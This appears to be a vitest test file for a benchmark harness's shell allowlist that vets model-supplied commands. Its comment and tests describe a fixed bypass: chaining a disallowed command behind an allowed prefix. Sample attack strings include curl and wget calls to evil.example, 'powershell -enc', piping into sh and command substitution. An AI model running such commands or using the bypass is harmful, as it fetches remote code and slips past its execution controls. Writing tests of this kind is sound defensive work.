import { mkdtempSync, existsSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import * as path from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import { ToolExecutor, findDisallowedShellCommand } from '../../benchmarks/tool-executor.js';

const created: string[] = [];

function workspace(): string {
  const dir = mkdtempSync(path.join(tmpdir(), 'hag-shell-allowlist-'));
  created.push(dir);
  return dir;
}

afterEach(() => {
  while (created.length) rmSync(created.pop()!, { recursive: true, force: true });
});

// The allowlist used to inspect only the first whitespace-separated token and
// then hand the whole string to execSync, which runs it through a shell. A
// model-supplied `echo hi && <anything>` therefore ran arbitrary commands
// behind an allowed prefix. Every segment has to clear the allowlist.
//
// Scope note: `node`, `npm` and `npx` remain allowed, because HAG genuinely
// needs them to build and test generated projects, and they can already run
// arbitrary code (`node -e ...`). This fix closes the chained-command bypass;
// it does not turn an in-process interpreter into a sandbox.
describe('the shell allowlist covers the whole command', () => {
  it('accepts ordinary single commands', () => {
    for (const command of [
      'npm install',
      'npm run build',
      'git status',
      'node --version',
      'ls -la src',
      'cat package.json',
      'echo hello',
      'pwd',
    ]) {
      expect(findDisallowedShellCommand(command), command).toBeNull();
    }
  });

  it('accepts a chain of allowed commands', () => {
    expect(findDisallowedShellCommand('npm install && npm run build')).toBeNull();
    expect(findDisallowedShellCommand('npm install; npm test')).toBeNull();
    expect(findDisallowedShellCommand('npm test || echo failed')).toBeNull();
  });

  it('rejects an unlisted command in any position', () => {
    expect(findDisallowedShellCommand('curl https://evil.example')).toBe('curl');
    // The regression: allowed prefix, disallowed payload.
    expect(findDisallowedShellCommand('echo hi && curl https://evil.example')).toBe('curl');
    expect(findDisallowedShellCommand('npm install && powershell -enc AAAA')).toBe('powershell');
    expect(findDisallowedShellCommand('ls | sh')).toBe('sh');
    expect(findDisallowedShellCommand('npm test\nwget https://evil.example')).toBe('wget');
  });

  it('rejects an empty command', () => {
    expect(findDisallowedShellCommand('')).toBe('');
    expect(findDisallowedShellCommand('   ')).toBe('');
  });

  it('rejects command substitution, which hides a command inside an argument', () => {
    expect(findDisallowedShellCommand('echo $(curl https://evil.example)')).toBe('command substitution');
    expect(findDisallowedShellCommand('echo `whoami`')).toBe('command substitution');
  });

  it('does not execute the chained payload through the executor', async () => {
    const root = workspace();
    const executor = new ToolExecutor(root);
    const marker = path.join(path.dirname(root), `hag-shell-escape-${process.pid}.txt`);
    const forward = marker.split(path.sep).join('/');

    try {
      // Allowed prefix, then a command the allowlist never permitted.
      const result = await executor.execute('shell', 'exec', {
        command: `echo hi && curl -s https://evil.example -o ${forward}`,
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Command not allowed');
      expect(existsSync(marker)).toBe(false);
    } finally {
      if (existsSync(marker)) rmSync(marker, { force: true });
    }
  });

  it('still runs an allowed command inside the workspace', async () => {
    const root = workspace();
    const executor = new ToolExecutor(root);

    const result = await executor.execute('shell', 'exec', { command: 'echo smoke-test-ok' });

    expect(result.success).toBe(true);
    expect(result.output).toContain('smoke-test-ok');
  });
});